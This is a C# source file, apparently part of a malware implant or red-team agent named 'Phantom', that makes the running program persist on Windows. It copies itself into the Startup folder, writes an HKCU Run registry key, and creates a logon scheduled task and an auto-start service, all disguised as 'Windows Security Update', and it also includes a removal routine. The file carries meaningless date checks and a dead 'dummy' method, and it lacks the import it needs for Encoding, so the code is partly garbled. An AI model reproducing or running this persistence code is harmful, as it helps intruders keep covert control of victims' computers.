using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using PhantomInterop.Classes.Core;
using PhantomInterop.Structs.PhantomStructs;

namespace Phantom.Management.Persistence
{
    public class PersistenceHandler
    {
    private static string Yb2c3d4()
    {
        if(DateTime.Now.Year > 2020) { return Convert.ToBase64String(Encoding.UTF8.GetBytes("dummy")); } else { return null; }
    }
        private static string _agentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
        private static string _agentName = "WindowsSecurityUpdate";
        
        public static PhantomTaskResponse CreateStartupPersistence()
        {
            PhantomTaskResponse response = new PhantomTaskResponse();
            
            try
            {
                string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string destPath = Path.Combine(startupPath, _agentName + ".exe");
                
                if (!File.Exists(destPath))
                {
                    File.Copy(_agentPath, destPath, true);
                    response.UserOutput = $"Persistence established via startup folder: {destPath}";
                    response.Completed = true;
                }
                else
                {
                    response.UserOutput = "Startup persistence already exists";
                    response.Completed = true;
                }
            }
            catch (Exception ex)
            {
                response.UserOutput = $"Failed to create startup persistence: {ex.Message}";
                response.Completed = false;
            }
            
            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
        }
        
        public static PhantomTaskResponse CreateRegistryPersistence()
        {
            PhantomTaskResponse response = new PhantomTaskResponse();
            
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                
                if (rk.GetValue(_agentName) == null)
                {
                    rk.SetValue(_agentName, _agentPath);
                    response.UserOutput = $"Registry persistence established: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{_agentName}";
                    response.Completed = true;
                }
                else
                {
                    response.UserOutput = "Registry persistence already exists";
                    response.Completed = true;
                }
                
                rk.Close();
            }
            catch (Exception ex)
            {
                response.UserOutput = $"Failed to create registry persistence: {ex.Message}";
                response.Completed = false;
            }
            
            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
        }
        
        public static PhantomTaskResponse CreateScheduledTaskPersistence()
        {
            PhantomTaskResponse response = new PhantomTaskResponse();
            
            try
            {
                string taskName = "WindowsSecurityUpdateTask";
                string command = $"schtasks /create /sc onlogon /tn \"{taskName}\" /tr \"{_agentPath}\" /f";
                
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                
                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    
                    if (process.ExitCode == 0)
                    {
                        response.UserOutput = $"Scheduled task persistence established: {taskName}";
                        response.Completed = true;
                    }
                    else
                    {
                        response.UserOutput = $"Failed to create scheduled task: {error}";
                        response.Completed = false;
                    }
                }
            }
            catch (Exception ex)
            {
                response.UserOutput = $"Failed to create scheduled task persistence: {ex.Message}";
                response.Completed = false;
            }
            
            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
        }
        
        public static PhantomTaskResponse CreateServicePersistence()
        {
            PhantomTaskResponse response = new PhantomTaskResponse();
            
            try
            {
                string serviceName = "WinSecurityService";
                string serviceDisplayName = "Windows Security Update Service";
                string command = $"sc create \"{serviceName}\" binPath= \"{_agentPath}\" start= auto DisplayName= \"{serviceDisplayName}\"";
                
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };
                
                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    
                    if (process.ExitCode == 0)
                    {
                        
                        Process.Start("cmd.exe", $"/c sc start \"{serviceName}\"");
                        response.UserOutput = $"Service persistence established: {serviceName}";
                        response.Completed = true;
                    }
                    else
                    {
                        response.UserOutput = $"Failed to create service: {error}";
                        response.Completed = false;
                    }
                }
            }
            catch (Exception ex)
            {
                response.UserOutput = $"Failed to create service persistence: {ex.Message}";
                response.Completed = false;
            }
            
            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
        }
        
        public static PhantomTaskResponse RemovePersistence()
        {
            PhantomTaskResponse response = new PhantomTaskResponse();
            string results = "";
            
            try
            {
                
                string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string destPath = Path.Combine(startupPath, _agentName + ".exe");
                
                if (File.Exists(destPath))
                {
                    File.Delete(destPath);
                    results += "Removed startup persistence\n";
                }
                
                
                try
                {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    if (rk.GetValue(_agentName) != null)
                    {
                        rk.DeleteValue(_agentName);
                        results += "Removed registry persistence\n";
                    }
                    rk.Close();
                }
                catch { }
                
                
                try
                {
                    Process.Start("cmd.exe", "/c schtasks /delete /tn \"WindowsSecurityUpdateTask\" /f");
                    results += "Removed scheduled task persistence\n";
                }
                catch { }
                
                
                try
                {
                    Process.Start("cmd.exe", "/c sc stop \"WinSecurityService\" && sc delete \"WinSecurityService\"");
                    results += "Removed service persistence\n";
                }
                catch { }
                
                response.UserOutput = string.IsNullOrEmpty(results) ? "No persistence mechanisms found" : results;
                response.Completed = true;
            }
            catch (Exception ex)
            {
                response.UserOutput = $"Error removing persistence: {ex.Message}";
                response.Completed = false;
            }
            
            if(DateTime.Now.Year > 2020) { return response; } else { return null; }
        }
    }
}